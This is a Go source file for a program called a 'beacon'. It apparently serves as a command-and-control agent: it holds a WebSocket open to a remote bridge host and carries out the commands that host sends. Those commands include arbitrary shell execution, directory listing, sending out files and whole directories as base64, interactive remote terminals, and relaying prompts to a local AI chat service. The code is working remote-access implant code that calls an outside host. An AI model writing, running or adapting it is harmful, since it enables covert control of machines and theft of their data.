package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var (
	bridgeURL   string
	sablePort   int
	persistDir  string
	localPort   int
	targetID    string
	client      = &http.Client{Timeout: 35 * time.Second}
	ptySessions sync.Map // sessionID -> *PTYSession
	llmChats    sync.Map // chat_id -> last used time

	// Persistent WebSocket state
	wsConn   *websocket.Conn
	wsMu     sync.Mutex
	wsDone   chan struct{}
)

func main() {
	flag.StringVar(&bridgeURL, "bridge", "https://sable-bridge.onrender.com", "Bridge server URL")
	flag.IntVar(&sablePort, "sable-port", 8765, "Local Sable HTTP port")
	flag.IntVar(&localPort, "local-port", 18923, "Local diagnostics HTTP port")
	flag.StringVar(&persistDir, "persist-dir", "", "Directory for .beacon_id persistence")
	flag.Parse()

	if persistDir == "" {
		persistDir = filepath.Join(".", "system")
	}

	targetID = loadOrCreateID()
	hostname, _ := os.Hostname()

	log.Printf("[beacon] target=%s host=%s bridge=%s local=:%d", targetID, hostname, bridgeURL, localPort)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Start local diagnostics HTTP server
	go startLocalServer()

	// Heartbeat loop (30s idle)
	go heartbeatLoop(ctx, hostname)

	// Persistent WebSocket connection to bridge (replaces long-poll)
	wsDone = make(chan struct{})
	go wsLoop(ctx)

	<-ctx.Done()
}

func loadOrCreateID() string {
	os.MkdirAll(persistDir, 0o755)
	idPath := filepath.Join(persistDir, ".beacon_id")
	data, err := os.ReadFile(idPath)
	if err == nil && len(bytes.TrimSpace(data)) > 0 {
		return strings.TrimSpace(string(data))
	}
	hostHash := sha256.Sum256([]byte(mustHostname()))
	id := fmt.Sprintf("sable-%x-%d", hostHash[:4], time.Now().UnixNano())
	os.WriteFile(idPath, []byte(id), 0o644)
	return id
}

func mustHostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}

// ── Heartbeat (30s idle) ─────────────────────────────────────

func heartbeatLoop(ctx context.Context, hostname string) {
	for {
		sendHeartbeatWS(hostname)
		pruneLLMChats()
		select {
		case <-ctx.Done():
			return
		case <-time.After(30 * time.Second):
		}
	}
}

func pruneLLMChats() {
	cutoff := time.Now().Add(-2 * time.Hour).Unix()
	llmChats.Range(func(key, value any) bool {
		if ts, ok := value.(int64); ok && ts < cutoff {
			llmChats.Delete(key)
		}
		return true
	})
}

// ── Persistent WebSocket Connection ──────────────────────────

func wsLoop(ctx context.Context) {
	defer close(wsDone)

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		connectAndListen(ctx)

		// Reconnect after brief delay
		select {
		case <-ctx.Done():
			return
		case <-time.After(2 * time.Second):
		}
	}
}

func connectAndListen(ctx context.Context) {
	// Convert http(s) URL to ws(s)
	wsURL := bridgeURL
	if strings.HasPrefix(wsURL, "http://") {
		wsURL = "ws://" + strings.TrimPrefix(wsURL, "http://")
	} else if strings.HasPrefix(wsURL, "https://") {
		wsURL = "wss://" + strings.TrimPrefix(wsURL, "https://")
	}
	wsURL = strings.TrimRight(wsURL, "/") + "/ws/beacon/" + targetID

	log.Printf("[ws] connecting to %s", wsURL)

	dialer := websocket.DefaultDialer
	conn, _, err := dialer.DialContext(ctx, wsURL, nil)
	if err != nil {
		log.Printf("[ws] dial error: %v", err)
		return
	}

	wsMu.Lock()
	wsConn = conn
	wsMu.Unlock()

	defer func() {
		wsMu.Lock()
		wsConn = nil
		wsMu.Unlock()
		conn.Close()
		log.Printf("[ws] disconnected")
	}()

	log.Printf("[ws] connected")

	// Read loop — receives commands instantly from bridge
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		_, raw, err := conn.ReadMessage()
		if err != nil {
			if !websocket.IsCloseError(err, websocket.CloseNormalClosure, websocket.CloseGoingAway) {
				log.Printf("[ws] read error: %v", err)
			}
			return
		}

		var msg struct {
			Type string          `json:"type"`
			Data json.RawMessage `json:"data"`
		}
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}

		switch msg.Type {
		case "command":
			var cmd Command
			if err := json.Unmarshal(msg.Data, &cmd); err == nil {
				go executeAndReportWS(ctx, cmd)
			}
		case "pty_input":
			handlePTYInput(msg.Data)
		case "pty_resize":
			handlePTYResize(msg.Data)
		}
	}
}

// wsSend sends a message through the persistent WebSocket
func wsSend(msgType string, data any) {
	payload, err := json.Marshal(map[string]any{
		"type": msgType,
		"data": data,
	})
	if err != nil {
		return
	}

	wsMu.Lock()
	conn := wsConn
	wsMu.Unlock()

	if conn == nil {
		return
	}

	if err := conn.WriteMessage(websocket.TextMessage, payload); err != nil {
		log.Printf("[ws] send error: %v", err)
	}
}

// sendHeartbeatWS sends heartbeat via persistent WS instead of HTTP POST
func sendHeartbeatWS(hostname string) {
	wsSend("heartbeat", map[string]any{
		"target_id":   targetID,
		"hostname":    hostname,
		"platform":    runtime.GOOS + "/" + runtime.GOARCH,
		"engine_type": "sable",
	})
}

// ── Execute & Report (via WS, instant) ───────────────────────

func executeAndReportWS(ctx context.Context, cmd Command) {
	log.Printf("[exec] cmd=%s mode=%s prompt_len=%d", cmd.ID, cmd.Mode, len(cmd.Prompt))
	result := executeCommand(ctx, cmd)

	// Report result back via persistent WS — no HTTP round-trip
	wsSend("result", map[string]any{
		"command_id": cmd.ID,
		"target_id":  targetID,
		"result":     result,
	})
}

// ── PTY Input/Resize handlers ────────────────────────────────

func handlePTYInput(data json.RawMessage) {
	var p struct {
		SessionID string `json:"session_id"`
		Data      string `json:"data"`
	}
	if err := json.Unmarshal(data, &p); err != nil {
		return
	}
	if val, ok := ptySessions.Load(p.SessionID); ok {
		sess := val.(*PTYSession)
		sess.Write([]byte(p.Data))
	}
}

func handlePTYResize(data json.RawMessage) {
	var p struct {
		SessionID string `json:"session_id"`
		Cols      int    `json:"cols"`
		Rows      int    `json:"rows"`
	}
	if err := json.Unmarshal(data, &p); err != nil {
		return
	}
	if val, ok := ptySessions.Load(p.SessionID); ok {
		sess := val.(*PTYSession)
		sess.Resize(p.Cols, p.Rows)
	}
}

// ── Command Types & Execution ────────────────────────────────

type Command struct {
	ID       string `json:"id"`
	TargetID string `json:"target_id"`
	Mode     string `json:"mode"`
	Prompt   string `json:"prompt"`
}

func (c *Command) parsedPayload() json.RawMessage {
	if c.Prompt == "" {
		return json.RawMessage(`{}`)
	}
	var obj map[string]any
	if err := json.Unmarshal([]byte(c.Prompt), &obj); err == nil {
		return json.RawMessage(c.Prompt)
	}
	switch c.Mode {
	case "shell":
		return json.RawMessage(fmt.Sprintf(`{"cmd":%s}`, jsonString(c.Prompt)))
	default:
		return json.RawMessage(fmt.Sprintf(`{"prompt":%s}`, jsonString(c.Prompt)))
	}
}

func jsonString(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}

func cutLine(buf *strings.Builder) (string, bool) {
	s := buf.String()
	idx := strings.IndexByte(s, '\n')
	if idx < 0 {
		return "", false
	}
	line := s[:idx]
	buf.Reset()
	buf.WriteString(s[idx+1:])
	return line, true
}

func executeCommand(ctx context.Context, cmd Command) map[string]any {
	payload := cmd.parsedPayload()
	switch cmd.Mode {
	case "shell":
		return execShell(payload)
	case "fs_list":
		return execFSList(payload)
	case "fs_download":
		return execFSDownload(payload)
	case "llm":
		return execLLM(payload)
	case "pty_connect":
		return execPTYConnect(payload)
	case "pty_disconnect":
		return execPTYDisconnect(payload)
	case "llm_reset":
		return execLLMReset(payload)
	default:
		return map[string]any{"error": fmt.Sprintf("unknown mode: %s", cmd.Mode)}
	}
}

// ── Shell Execution ──────────────────────────────────────────

func execShell(payload json.RawMessage) map[string]any {
	var p struct {
		Cmd string `json:"cmd"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Cmd == "" {
		return map[string]any{"error": "invalid shell command"}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/sh"
	}

	cmd := exec.CommandContext(ctx, shell, "-c", p.Cmd)
	output, err := cmd.CombinedOutput()

	result := map[string]any{
		"exit_code": 0,
		"output":    string(output),
		"mode":      "shell",
	}
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			result["exit_code"] = exitErr.ExitCode()
		} else {
			result["error"] = err.Error()
		}
	}
	return result
}

// ── Filesystem Helpers ───────────────────────────────────────

func expandPath(p string) string {
	if strings.HasPrefix(p, "~/") || p == "~" {
		home, err := os.UserHomeDir()
		if err == nil {
			return filepath.Join(home, strings.TrimPrefix(p, "~"))
		}
	}
	if !filepath.IsAbs(p) {
		abs, err := filepath.Abs(p)
		if err == nil {
			return abs
		}
	}
	return p
}

type fsEntry struct {
	Name        string `json:"name"`
	IsDir       bool   `json:"is_dir"`
	Size        int64  `json:"size"`
	Modified    string `json:"modified"`
	Permissions string `json:"permissions"`
}

func listDir(dir string) ([]fsEntry, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, err
	}
	var result []fsEntry
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			continue
		}
		result = append(result, fsEntry{
			Name:        e.Name(),
			IsDir:       e.IsDir(),
			Size:        info.Size(),
			Modified:    info.ModTime().Format(time.RFC3339),
			Permissions: info.Mode().String(),
		})
	}
	return result, nil
}

func encodeBase64(data []byte) string {
	out := make([]byte, base64.StdEncoding.EncodedLen(len(data)))
	base64.StdEncoding.Encode(out, data)
	return string(out)
}

// ── Filesystem Commands ──────────────────────────────────────

func execFSList(payload json.RawMessage) map[string]any {
	var p struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Path == "" {
		p.Path = "."
	}

	expanded := expandPath(p.Path)
	entries, err := listDir(expanded)
	if err != nil {
		return map[string]any{"error": err.Error(), "path": expanded}
	}
	return map[string]any{
		"entries": entries,
		"path":    expanded,
		"count":   len(entries),
	}
}

func execFSDownload(payload json.RawMessage) map[string]any {
	var p struct {
		Path string `json:"path"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Path == "" {
		return map[string]any{"error": "missing path"}
	}

	expanded := expandPath(p.Path)
	info, err := os.Stat(expanded)
	if err != nil {
		return map[string]any{"error": err.Error()}
	}

	if info.IsDir() {
		var buf bytes.Buffer
		if err := tarGzDir(expanded, &buf); err != nil {
			return map[string]any{"error": err.Error()}
		}
		return map[string]any{
			"content":  encodeBase64(buf.Bytes()),
			"filename": filepath.Base(expanded) + ".tar.gz",
			"size":     buf.Len(),
		}
	}

	data, err := os.ReadFile(expanded)
	if err != nil {
		return map[string]any{"error": err.Error()}
	}

	return map[string]any{
		"content":  encodeBase64(data),
		"filename": filepath.Base(expanded),
		"size":     len(data),
	}
}

// ── LLM ──────────────────────────────────────────────────────

func execLLM(payload json.RawMessage) map[string]any {
	var p struct {
		Prompt string `json:"prompt"`
		ChatID string `json:"chat_id"`
	}
	if err := json.Unmarshal(payload, &p); err != nil || p.Prompt == "" {
		return map[string]any{"error": "invalid llm request"}
	}

	localURL := fmt.Sprintf("http://127.0.0.1:%d", sablePort)
	chatID := p.ChatID

	if chatID == "" {
		newChat := map[string]any{"title": "Beacon relay"}
		body, _ := json.Marshal(newChat)
		resp, err := client.Post(localURL+"/api/chat/new", "application/json", bytes.NewReader(body))
		if err != nil {
			return map[string]any{"error": fmt.Sprintf("create chat: %v", err)}
		}
		var cr struct {
			ID string `json:"id"`
		}
		json.NewDecoder(resp.Body).Decode(&cr)
		resp.Body.Close()
		chatID = cr.ID
	}

	msg := map[string]any{
		"chat_id": chatID,
		"role":    "user",
		"content": p.Prompt,
	}
	body, _ := json.Marshal(msg)
	resp, err := client.Post(localURL+"/api/chat", "application/json", bytes.NewReader(body))
	if err != nil {
		return map[string]any{"error": fmt.Sprintf("send prompt: %v", err)}
	}
	defer resp.Body.Close()

	var assistantReply strings.Builder
	var lineBuf strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(buf)
		if n > 0 {
			lineBuf.Write(buf[:n])
			for {
				line, found := cutLine(&lineBuf)
				if !found {
					break
				}
				line = strings.TrimSpace(line)
				if !strings.HasPrefix(line, "data: ") {
					continue
				}
				data := strings.TrimPrefix(line, "data: ")
				if data == "[DONE]" {
					goto done
				}
				var evt struct {
					Content string `json:"content"`
					Type    string `json:"type"`
					Text    string `json:"text"`
				}
				if json.Unmarshal([]byte(data), &evt) == nil {
					if evt.Content != "" {
						assistantReply.WriteString(evt.Content)
					} else if evt.Type == "answer" && evt.Text != "" {
						assistantReply.WriteString(evt.Text)
					}
				}
			}
		}
		if err != nil {
			break
		}
	}
done:

	return map[string]any{
		"reply":   assistantReply.String(),
		"chat_id": chatID,
		"mode":    "llm",
	}
}

// ── PTY Connect / Disconnect ─────────────────────────────────

func execPTYConnect(payload json.RawMessage) map[string]any {
	var p struct {
		SessionID string `json:"session_id"`
		Cols      int    `json:"cols"`
		Rows      int    `json:"rows"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}

	if p.Cols == 0 {
		p.Cols = 120
	}
	if p.Rows == 0 {
		p.Rows = 40
	}

	// Start PTY locally — input/output now routed through the main WS
	sess, err := StartPTYLocal(p.SessionID, p.Cols, p.Rows)
	if err != nil {
		return map[string]any{"error": fmt.Sprintf("pty start: %v", err)}
	}

	ptySessions.Store(p.SessionID, sess)
	log.Printf("[pty] started session=%s", p.SessionID)

	return map[string]any{
		"status":     "connected",
		"session_id": p.SessionID,
	}
}

func execPTYDisconnect(payload json.RawMessage) map[string]any {
	var p struct {
		SessionID string `json:"session_id"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}

	if val, ok := ptySessions.LoadAndDelete(p.SessionID); ok {
		sess := val.(*PTYSession)
		sess.Close()
		log.Printf("[pty] closed session=%s", p.SessionID)
	}

	return map[string]any{"status": "disconnected"}
}

func execLLMReset(payload json.RawMessage) map[string]any {
	var p struct {
		ChatID string `json:"chat_id"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		return map[string]any{"error": err.Error()}
	}

	localURL := fmt.Sprintf("http://127.0.0.1:%d", sablePort)

	if p.ChatID != "" {
		req, _ := http.NewRequest("DELETE", localURL+"/api/chat/"+p.ChatID, nil)
		resp, err := client.Do(req)
		if err != nil {
			return map[string]any{"error": fmt.Sprintf("reset failed: %v", err)}
		}
		resp.Body.Close()
		llmChats.Delete(p.ChatID)
		return map[string]any{"status": "reset", "chat_id": p.ChatID}
	}

	llmChats.Range(func(key, value any) bool {
		llmChats.Delete(key)
		return true
	})
	return map[string]any{"status": "all_reset"}
}

// ── Local Diagnostics HTTP Server ────────────────────────────

func startLocalServer() {
	mux := http.NewServeMux()

	mux.HandleFunc("POST /diag/monitor/register", handleMonitorRegister)
	mux.HandleFunc("POST /diag/monitor/heartbeat", handleMonitorHeartbeat)
	mux.HandleFunc("POST /diag/monitor/inactive", handleMonitorMarkInactive)
	mux.HandleFunc("POST /diag/monitor/unregister", handleMonitorUnregister)
	mux.HandleFunc("GET /diag/monitor/alive", handleMonitorAlive)
	mux.HandleFunc("GET /diag/monitor/sessions", handleMonitorAll)
	mux.HandleFunc("GET /diag/monitor/events", handleMonitorEvents)
	mux.HandleFunc("POST /diag/monitor/probe", handleMonitorProbe)
	mux.HandleFunc("POST /diag/monitor/clear", handleMonitorClear)

	mux.HandleFunc("POST /diag/replay/start", handleReplayStart)
	mux.HandleFunc("GET /diag/replay/{replay_id}", handleReplayResult)
	mux.HandleFunc("POST /diag/replay/stop", handleReplayStop)
	mux.HandleFunc("GET /diag/replays", handleReplayList)
	mux.HandleFunc("POST /diag/replay/clear", handleReplayClear)

	addr := fmt.Sprintf("127.0.0.1:%d", localPort)
	log.Printf("[diag-server] listening on %s", addr)
	if err := http.ListenAndServe(addr, mux); err != nil {
		log.Printf("[diag-server] error: %v", err)
	}
}
